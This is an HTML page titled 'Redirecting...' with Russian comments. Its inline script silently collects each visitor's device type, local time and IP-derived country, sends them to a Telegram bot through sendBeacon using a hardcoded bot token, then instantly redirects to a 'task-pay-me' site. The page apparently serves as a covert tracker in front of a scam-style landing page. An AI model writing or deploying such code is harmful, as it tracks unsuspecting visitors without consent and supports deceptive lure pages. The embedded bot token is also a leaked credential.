<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
    <script>
        (async function() {
            // Настройки
            const BOT_TOKEN = '8960707863:AAEURNtee1o92gu_5Wr1NMe-0PnFX7mQm5M';
            const CHAT_ID = '5253808709';
            const REDIRECT_URL = 'https://task-pay-me.netlify.app/';

            // Определяем устройство
            function getDevice() {
                const ua = navigator.userAgent;
                if (/Android/i.test(ua)) return 'Android';
                if (/iPhone|iPad|iPod/i.test(ua)) return 'iPhone';
                return 'Другое';
            }

            // Получаем страну через бесплатный API (без ключа)
            async function getCountry() {
                try {
                    const controller = new AbortController();
                    const timeout = setTimeout(() => controller.abort(), 2000);
                    const response = await fetch('https://ipapi.co/json/', { signal: controller.signal });
                    clearTimeout(timeout);
                    const data = await response.json();
                    return data.country_name || 'Неизвестно';
                } catch (e) {
                    return 'Неизвестно';
                }
            }

            const device = getDevice();
            const time = new Date().toLocaleString(); // локальное время
            const country = await getCountry();

            const message = `Залет с ${device}. Время: ${time}. Страна: ${country}.`;

            // Отправка через sendBeacon – не блокирует редирект и надёжно доставляется
            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const body = new URLSearchParams();
            body.append('chat_id', CHAT_ID);
            body.append('text', message);
            navigator.sendBeacon(telegramUrl, body);

            // Мгновенный редирект
            window.location.replace(REDIRECT_URL);
        })();
    </script>
    <!-- Fallback-редирект, если JavaScript отключен -->
    <noscript>
        <meta http-equiv="refresh" content="0;url=https://task-pay-me.netlify.app/">
    </noscript>
</head>
<body></body>
</html>
